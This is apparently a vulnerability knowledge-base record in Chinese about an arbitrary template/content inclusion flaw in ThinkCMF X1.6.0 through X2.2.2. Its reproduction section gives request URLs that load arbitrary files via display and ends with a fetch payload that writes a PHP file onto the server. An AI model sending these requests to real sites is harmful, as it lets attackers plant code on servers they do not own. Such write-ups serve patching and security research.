---
source: "hatch 补库批 20260928"
product: "ThinkCMF X1.6.0/X2.1.0/X2.2.0–2.2.2"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ThinkCMF 框架上的任意内容包含漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Homebase公开display/fetch可路由；templateFile存在，模板引擎Think，缓存目录可写"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-243f0aba38c5d1b260c733ea"
entity_id: "ve-243f0aba38c5d1b260c733ea"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Homebase公开display/fetch可路由；templateFile存在，模板引擎Think，缓存目录可写

- **结论使用边界（1）**：前半添加test_public只是路由机制演示而非原版漏洞，必须与后面原生display/fetch区分。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：末文说fetch不需知道文件路径但最终payload仍给templateFilepublic/index，需明确存在性要求。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：TMPL_ENGINE_TYPE=Think可纠正416误称Smarty；文件内容包含与恶意模板执行需分能力。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：无原始来源/修复版/实际最终执行响应文本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkCMF 框架上的任意内容包含漏洞

一、漏洞简介
------------

二、漏洞影响
------------

ThinkCMF X1.6.0 ThinkCMF X2.1.0 ThinkCMF X2.2.0 ThinkCMF X2.2.1 ThinkCMF
X2.2.2

三、复现过程
------------

根据index.php中的配置，他的项目路径为application，打开 Portal 下的
Controller 目录，选择一个控制类文件。

![](./.resource/ThinkCMF框架上的任意内容包含漏洞/media/rId24.png)

发现他的父类为Common\\Controller\\HomebaseController。
在HomeBaseController中加入如下测试代码

![](./.resource/ThinkCMF框架上的任意内容包含漏洞/media/rId25.png)

ThinkPHP是一套基于MVC的应用程序框架，被分成三个核心部件：模型（M）、视图（V）、控制器（C）。
由于添加的代码在控制器中，根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public,
而添加的代码正好符合该条件。
可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。

    http://127.0.0.1/cmfx-master/?a=test_public&arg1=run%20success

![](./.resource/ThinkCMF框架上的任意内容包含漏洞/media/rId26.png)

HomeBaseController类中有一些访问权限为public的函数，

![](./.resource/ThinkCMF框架上的任意内容包含漏洞/media/rId27.png)

重点关注display函数.看描述就是可以自定义加载模版，通过
\$this-\>parseTemplate
函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。
然后调用THinkphp Controller 函数的display方法

    /**
     * 加载模板和页面输出 可以返回输出内容
     * @access public
     * @param string $templateFile 模板文件名
     * @param string $charset 模板输出字符集
     * @param string $contentType 输出类型
     * @param string $content 模板输出内容
     * @return mixed
     */
    public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') {
        parent::display($this->parseTemplate($templateFile), $charset, $contentType,$content,$prefix);
    }

再往下就是调用Think View的fetch方法，这里的TMPL\_ENGINE\_TYPE 为Think,
最终模版内容解析在ParseTemplateBehavior中完成 如下调用即可加载任意文件
<http://0-sec.org:81/cmfx-master/?a=display&templateFile=README.md>

![](./.resource/ThinkCMF框架上的任意内容包含漏洞/media/rId29.png)

往下面翻阅发现还有fetch方法，display方法相对fetch只是多了一个render的过程，而且这里不需要知道文件路径

最终完美payload

    http://0-sec.org/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>
